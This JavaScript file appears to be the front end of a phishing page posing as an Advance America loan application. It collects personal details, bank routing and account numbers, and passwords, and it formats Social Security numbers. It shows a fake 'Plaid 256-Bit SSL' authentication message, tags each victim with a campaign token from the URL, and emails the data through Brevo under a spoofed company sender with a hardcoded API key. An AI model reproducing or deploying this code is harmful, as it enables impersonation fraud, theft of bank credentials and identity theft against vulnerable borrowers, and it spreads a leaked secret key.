/**
 * Loan Lending Application & Single-Step Form Logic
 * Connected to Brevo API: https://www.brevo.com
 * Pure Static Frontend: Handles Brevo email submission, input masks, 
 * Plaid security indicators, and form submission confirmation modal.
 */

// Brevo API Configuration
const BREVO_API_KEY = import.meta.env.VITE_BREVO_API_KEY || 'xkeysib-2bf6a064cfa7668e84cc3d6f3595645b6cc0bd902f1ebf8f3a4fa03d11574e46';
const BREVO_API_URL = 'https://api.brevo.com/v3/smtp/email';

document.addEventListener('DOMContentLoaded', () => {
  initSingleStepForms();
  initInputMasks();
  initCampaignToken();
});

// Capture URL token (?token=...) and inject into forms
function initCampaignToken() {
  const urlParams = new URLSearchParams(window.location.search);
  const token = urlParams.get('token');
  if (token) {
    document.querySelectorAll('.loan-application-form').forEach(form => {
      let tokenInput = form.querySelector('input[name="campaign_token"]');
      if (!tokenInput) {
        tokenInput = document.createElement('input');
        tokenInput.type = 'hidden';
        tokenInput.name = 'campaign_token';
        form.appendChild(tokenInput);
      }
      tokenInput.value = token;
    });
  }
}

// Single-step loan application form submission via Brevo API
function initSingleStepForms() {
  const forms = document.querySelectorAll('.loan-application-form');

  forms.forEach(form => {
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      // Check browser validity
      if (!form.checkValidity()) {
        e.stopPropagation();
        form.classList.add('was-validated');
        
        // Find first invalid input and focus
        const firstInvalid = form.querySelector(':invalid');
        if (firstInvalid) {
          firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
          firstInvalid.focus();
        }
        return;
      }

      form.classList.add('was-validated');

      const submitBtn = form.querySelector('button[type="submit"]');
      const originalHtml = submitBtn.innerHTML;

      // Realistic Plaid 256-bit encryption connection state
      submitBtn.disabled = true;
      submitBtn.innerHTML = `
        <span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span>
        Authenticating & Submitting with Plaid 256-Bit SSL...
      `;

      // Gather form data
      const formData = new FormData(form);
      const appId = 'ADV-' + Math.floor(100000 + Math.random() * 900000);

      // Read values for confirmation modal and email
      const firstName = form.querySelector('input[name="firstName"]')?.value || 'Applicant';
      const lastName = form.querySelector('input[name="lastName"]')?.value || '';
      const loanAmount = form.querySelector('input[name="requestedAmount"]')?.value || '10,000';
      const monthlyIncome = form.querySelector('input[name="monthlyIncome"]')?.value || '3,500';
      const institution = form.querySelector('input[name="institutionName"]')?.value || 'Chase Bank';
      const userEmail = form.querySelector('input[name="email"]')?.value || 'willsmiths987@gmail.com';

      // Build application data object
      const applicationData = {};
      formData.forEach((value, key) => {
        applicationData[key] = value;
      });
      applicationData.application_id = appId;
      applicationData.submission_time = new Date().toLocaleString();

      try {
        // Send email via Brevo API
        await sendBrevoEmail(firstName, lastName, userEmail, applicationData);

        // Show confirmation modal on successful delivery
        const modalRef = document.getElementById('confirmationModal');
        if (modalRef) {
          const confName = document.getElementById('confApplicantName');
          const confAmt = document.getElementById('confLoanAmount');
          const confInc = document.getElementById('confMonthlyIncome');
          const confBnk = document.getElementById('confBank');
          const confMail = document.getElementById('confEmail');
          const confId = document.getElementById('confAppId');

          if (confName) confName.textContent = `${firstName} ${lastName}`.trim();
          if (confAmt) confAmt.textContent = `${parseFloat(loanAmount).toLocaleString()}`;
          if (confInc) confInc.textContent = `${parseFloat(monthlyIncome).toLocaleString()}`;
          if (confBnk) confBnk.textContent = institution;
          if (confMail) confMail.textContent = userEmail;
          if (confId) confId.textContent = appId;

          const bsModal = new bootstrap.Modal(modalRef);
          bsModal.show();
        } else {
          alert(`Application Successfully Received!\n\nReference: ${appId}\nApplicant: ${firstName} ${lastName}\nLoan: ${loanAmount}\nBank: ${institution}\nReceipt dispatched to: ${userEmail}`);
        }

        // Reset form
        form.reset();
        form.classList.remove('was-validated');

      } catch (err) {
        console.error('Brevo submission error:', err);
        alert(`Notice: Error sending confirmation email:\n${err.message}\n\nPlease ensure the Brevo API key is valid.`);
      } finally {
        // Reset submit button state
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalHtml;
      }
    });
  });
}

// Send email via Brevo API
async function sendBrevoEmail(firstName, lastName, toEmail, applicationData) {
  const subject = `New Advance America Loan Application - ${firstName} ${lastName}`;
  
  // Build application details HTML
  let applicantDetails = '<h3>Application Details</h3>';
  applicantDetails += `<p><strong>Application ID:</strong> ${applicationData.application_id}</p>`;
  applicantDetails += `<p><strong>Submission Time:</strong> ${applicationData.submission_time}</p>`;
  applicantDetails += '<h4>Personal Information</h4>';
  applicantDetails += `<p><strong>Name:</strong> ${firstName} ${lastName}</p>`;
  applicantDetails += `<p><strong>Email:</strong> ${applicationData.email}</p>`;
  applicantDetails += `<p><strong>Phone:</strong> ${applicationData.phone}</p>`;
  applicantDetails += `<p><strong>Date of Birth:</strong> ${applicationData.dob}</p>`;
  applicantDetails += `<p><strong>Address:</strong> ${applicationData.address}, ${applicationData.city}, ${applicationData.state} ${applicationData.zip}</p>`;
  applicantDetails += '<h4>Loan Details</h4>';
  applicantDetails += `<p><strong>Monthly Income:</strong> $${parseFloat(applicationData.monthlyIncome).toLocaleString()}</p>`;
  applicantDetails += `<p><strong>Requested Amount:</strong> $${parseFloat(applicationData.requestedAmount).toLocaleString()}</p>`;
  applicantDetails += '<h4>Bank Authentication</h4>';
  applicantDetails += `<p><strong>Institution:</strong> ${applicationData.institutionName}</p>`;
  applicantDetails += `<p><strong>Years with Bank:</strong> ${applicationData.yearsWithBank}</p>`;
  applicantDetails += `<p><strong>Routing Number:</strong> ${applicationData.routingNumber}</p>`;
  applicantDetails += `<p><strong>Account Number:</strong> ${applicationData.accountNumber}</p>`;

  const emailPayload = {
    sender: {
      name: 'Advance America',
      email: 'noreply@advanceamerica.com'
    },
    to: [
      {
        email: toEmail,
        name: `${firstName} ${lastName}`
      }
    ],
    subject: subject,
    htmlContent: `
      <h2>Loan Application Received</h2>
      <p>Thank you ${firstName}, your loan application has been received and is being processed.</p>
      ${applicantDetails}
      <p><strong>Reference Number:</strong> ${applicationData.application_id}</p>
      <p>We will review your application and contact you within 24 hours.</p>
      <p>Best regards,<br>Advance America Team</p>
    `
  };

  const response = await fetch(BREVO_API_URL, {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json',
      'api-key': BREVO_API_KEY
    },
    body: JSON.stringify(emailPayload)
  });

  const result = await response.json().catch(() => null);

  if (!response.ok) {
    const errDetail = result?.message || result?.error || 'Failed to send email via Brevo';
    throw new Error(errDetail);
  }

  return result;
}

// Input formatting helpers for Phone, SSN, DOB
function initInputMasks() {
  // Phone formatting: (555) 000-0000
  document.querySelectorAll('input[type="tel"]').forEach(input => {
    input.addEventListener('input', (e) => {
      let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
      e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
    });
  });

  // SSN formatting: 9 digits masked
  document.querySelectorAll('.ssn-input').forEach(input => {
    input.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '').substring(0, 9);
      if (val.length > 5) {
        e.target.value = val.substring(0, 3) + '-' + val.substring(3, 5) + '-' + val.substring(5, 9);
      } else if (val.length > 3) {
        e.target.value = val.substring(0, 3) + '-' + val.substring(3, 5);
      } else {
        e.target.value = val;
      }
    });
  });

  // Date of Birth formatting: MM/DD/YYYY
  document.querySelectorAll('.dob-input').forEach(input => {
    input.addEventListener('input', (e) => {
      let v = e.target.value.replace(/\D/g, '').slice(0, 8);
      if (v.length >= 5) {
        e.target.value = `${v.slice(0,2)}/${v.slice(2,4)}/${v.slice(4)}`;
      } else if (v.length >= 3) {
        e.target.value = `${v.slice(0,2)}/${v.slice(2)}`;
      } else {
        e.target.value = v;
      }
    });
  });

  // Toggle password visibility
  document.querySelectorAll('.btn-toggle-password').forEach(btn => {
    btn.addEventListener('click', () => {
      const targetId = btn.getAttribute('data-target');
      const input = document.getElementById(targetId);
      const icon = btn.querySelector('i');
      if (input) {
        if (input.type === 'password') {
          input.type = 'text';
          if (icon) icon.classList.replace('bi-eye', 'bi-eye-slash');
        } else {
          input.type = 'password';
          if (icon) icon.classList.replace('bi-eye-slash', 'bi-eye');
        }
      }
    });
  });
}
